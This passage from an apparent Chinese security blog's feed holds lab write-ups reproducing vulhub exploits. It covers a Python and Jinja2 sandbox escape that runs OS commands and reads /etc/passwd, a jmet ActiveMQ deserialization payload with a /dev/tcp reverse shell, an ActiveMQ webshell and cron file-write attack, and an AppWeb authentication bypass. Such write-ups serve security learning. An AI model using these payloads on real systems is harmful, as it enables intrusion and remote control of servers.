'_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class 'nt.ScandirIterator'&gt;, &lt;class 'nt.DirEntry'&gt;, &lt;class 'PyHKEY'&gt;, &lt;class 'zipimport.zipimporter'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class '__main__.A'&gt;, &lt;class '__main__.B'&gt;]

#5 __globals__ :以字典的形式返回函数所在模块命名空间的所有变量。
#所有的函数都会有一个__globals__属性，可以通过globals获得大量内置函数，包括eval，exec等执行命令的1的函数

#6 __builtin__&amp;&amp;__builtins__: python中直接能用的比如int(),list()等函数，可以直接在builtins里面查询到。（python3）
&gt;&gt;&gt; import builtins
&gt;&gt;&gt; dir(builtins)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']

#python2：dir(__builtins__)
'''
__builtin__ 和 __builtins__之间是什么关系呢？
1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。
2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身
'''



#利用python特殊方法bypass沙盒


## 构造继承链的思想

#1.任意使用一个内置对象用class拿到他所对应的类
#2.用bases拿到基类（&lt;class 'object'&gt;）
#3.用subclasses()拿到子类列表
#4.在字类里面寻找可以利用的类

&gt;&gt;&gt; t = ().__class__.__bases__[0].__subclasses__()
&gt;&gt;&gt; for c in t:
...     if c.__name__== 'file':
...             print t.index(c)
... 
40
#寻找file对象


&gt;&gt;&gt; dir(().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines)
['__call__', '__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__module__', '__name__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__self__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__']
#使用dir查看对象内置方法：



</code></pre>
<p>同样的方法使用eval方法来获取目录文件</p>
<pre><code class="language-jinja2">{% for c in ().__class__.__bases__[0].__subclasses__(): %}
{% if c.__name__ == '_IterationGuard': %}
{{c.__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('ls').read()&quot;) }}
{% endif %}
{% endfor %}
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/4.png" alt="" loading="lazy"></figure>
<p>参考链接：<a href="https://www.freebuf.com/articles/web/98619.html">https://www.freebuf.com/articles/web/98619.html</a></p>
<p>​		<a href="https://www.cnblogs.com/hackxf/p/10480071.html">https://www.cnblogs.com/hackxf/p/10480071.html</a></p>
<p>​		<a href="https://eustiar.com/archives/157">https://eustiar.com/archives/157</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2015-5254]]></title>
        <id>https://www.yyxyy.xyz/post/cve-2015-5254/</id>
        <link href="https://www.yyxyy.xyz/post/cve-2015-5254/">
        </link>
        <updated>2021-06-09T07:58:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="activemq-反序列化漏洞cve-2015-5254复现">ActiveMQ 反序列化漏洞（CVE-2015-5254）复现</h2>
<h4 id="漏洞简介">漏洞简介</h4>
<p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。</p>
<h4 id="漏洞复现">漏洞复现</h4>
<ol>
<li>
<p>漏洞利用过程</p>
<ol>
<li>构造可执行命令的序列化对象</li>
<li>作为一个消息发送给目标61616端口</li>
<li>访问的Web管理页面，读取消息，触发漏洞</li>
</ol>
</li>
<li>
<p>使用jmet进行漏洞利用</p>
<pre><code class="language-shell"> wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
 mkdir external
</code></pre>
</li>
<li>
<p>执行命令</p>
<ol>
<li>
<pre><code class="language-shell">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/sucess&quot; -Yp ROME   127.0.0.1   61616
</code></pre>
</li>
</ol>
</li>
</ol>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254/1.png" alt="" loading="lazy"></figure>
<ol start="4">
<li>此时目标站ActiveMQ会收到名为事件的队列，在admin/queues.jsp下面（账号admin密码admin）</li>
</ol>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254/2.png" alt="" loading="lazy"></figure>
<ol start="5">
<li>
<p>点击这个消息便出发了漏洞</p>
</li>
<li>
<p>此时进入容器，发现存在tmp目录已经创建说明漏洞利用成功</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//3.png" alt="" loading="lazy"></figure>
</li>
</ol>
<p>最后反弹shell</p>
<p>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bin -i &gt;&amp; /dev/tcp/127.0.0.1/7777 0&gt;&amp;1&quot; -Yp ROME 192.168.180.133 61616</p>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//4.png" alt="" loading="lazy"></figure>
<p>点击消息</p>
<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//5.png" alt="" loading="lazy"></figure>
<p>反弹shell成功</p>
<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2015-5254//6.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2016-3088]]></title>
        <id>https://www.yyxyy.xyz/post/cve-2016-3088/</id>
        <link href="https://www.yyxyy.xyz/post/cve-2016-3088/">
        </link>
        <updated>2021-06-09T07:57:28.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cve-2016-3088漏洞复现">CVE-2016-3088漏洞复现</h1>
<h2 id="背景描述">背景描述</h2>
<p>ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用。</p>
<h2 id="原理分析">原理分析</h2>
<p>ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录，且路径在conf/jetty.xml中定义，定义如下：</p>
<pre><code class="language-xml">&lt;bean class =“ org.eclipse.jetty.webapp.WebAppContext”&gt;
    &lt;property name =“ contextPath” value =“ / fileserver” /&gt;
    &lt;property name =“ resourceBase” value =“ $ {activemq.home} / webapps / fileserver” /&gt;
    &lt;property name =“ logUrlOnStart” value =“ true” /&gt;
    &lt;property name =“ parentLoaderPriority” value =“ true” /&gt;
&lt;/ bean&gt;
</code></pre>
<pre><code>fileserver:储存文件的接口，可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，
其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但是随后发现：
1.其使用率并不高
2.文件操作容易出现漏洞
所以ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。
</code></pre>
<h2 id="漏洞利用">漏洞利用</h2>
<p>首先写入一个文件，随后使用移动文件的请求将文件移动到任意位置，<br>
造成任意文件写入漏洞。文件写入有如下方法可以利用：</p>
<ol>
<li>写入webshell</li>
<li>写入cron或ssh key等文件</li>
<li>写入jar或jetty.xml等库和配置文件</li>
</ol>
<h2 id="漏洞复现">漏洞复现</h2>
<p>1.上传webshell，但是不会解析</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/1.png" alt="" loading="lazy"></figure>
<p>2.移动到api目录下面（api下面会解析）</p>
<p>首先看一下api路径（(http://ip:8161/admin/test/systemProperties.jsp)）</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/2.png" alt="" loading="lazy"></figure>
<p>移动到api目录下。</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/3.png" alt="" loading="lazy"></figure>
<p>查看api目录</p>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/4.png" alt="" loading="lazy"></figure>
<p>3.执行命令</p>
<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/5.png" alt="" loading="lazy"></figure>
<p>利用完毕。</p>
<p>4.利用cron添加定时任务反弹shell</p>
<p>添加shell脚本</p>
<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/6.png" alt="" loading="lazy"></figure>
<p>移动shell脚本到/etc/cron.d下面</p>
<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/7.png" alt="" loading="lazy"></figure>
<p>反弹shell</p>
<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/8.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2016-3088/9.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[docker命令学习]]></title>
        <id>https://www.yyxyy.xyz/post/docker-ming-ling-xue-xi/</id>
        <link href="https://www.yyxyy.xyz/post/docker-ming-ling-xue-xi/">
        </link>
        <updated>2021-06-06T03:58:04.000Z</updated>
        <content type="html"><![CDATA[<h4 id="docker">docker</h4>
<h6 id="开启docker">开启docker</h6>
<pre><code class="language-shell">systemctl start docker
</code></pre>
<h6 id="关闭docker">关闭docker</h6>
<pre><code class="language-shell">service docker stop  或者  systemctl stop docker
</code></pre>
<h6 id="容器列表">容器列表</h6>
<pre><code class="language-shell">docker ps

docker ps -a
</code></pre>
<h6 id="开启容器">开启容器</h6>
<pre><code class="language-shell">docker start 容器名称  
比如开启名字为cli容器： docker start cli
</code></pre>
<h6 id="vulhub靶场">vulhub靶场</h6>
<pre><code class="language-shell">docker-compose up -d         //docker生成靶场
 
docker-compose down        //要进入另一个漏洞靶场，则先要结束掉当前漏洞靶场
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2018-8715复现]]></title>
        <id>https://www.yyxyy.xyz/post/cve-2018-8715-fu-xian/</id>
        <link href="https://www.yyxyy.xyz/post/cve-2018-8715-fu-xian/">
        </link>
        <updated>2021-06-06T03:57:21.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cve-2018-8715复现">CVE-2018-8715复现</h1>
<h4 id="前提条件">前提条件</h4>
<p>首先得已知一个用户名</p>
<h4 id="appweb简介">AppWeb简介</h4>
<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
<ul>
<li>1.basic 传统HTTP基础认证</li>
<li>2.digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
<li>3.form 表单认证</li>
</ul>
<h4 id="漏洞描述">漏洞描述</h4>
<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
<h4 id="漏洞复现">漏洞复现</h4>
<p>0x1 访问目标站</p>
<p>输入已知账号，然后抓包。</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2018-8715/1.png" alt="" loading="lazy"></figure>
<p>0x2 修改请求方式，添加session</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2018-8715/2.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2018-8715/3.png" alt="" loading="lazy"></figure>
<p>这一步拿到session我们也可以直接在浏览器添加cookie，也能完成。</p>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2018-8715/4.png" alt="" loading="lazy"></figure>
<p>[+]具体参考链接<a href="https://www.freebuf.com/column/221660.html">https://www.freebuf.com/column/221660.html</a></p>
]]></content>
    </entry>
</feed>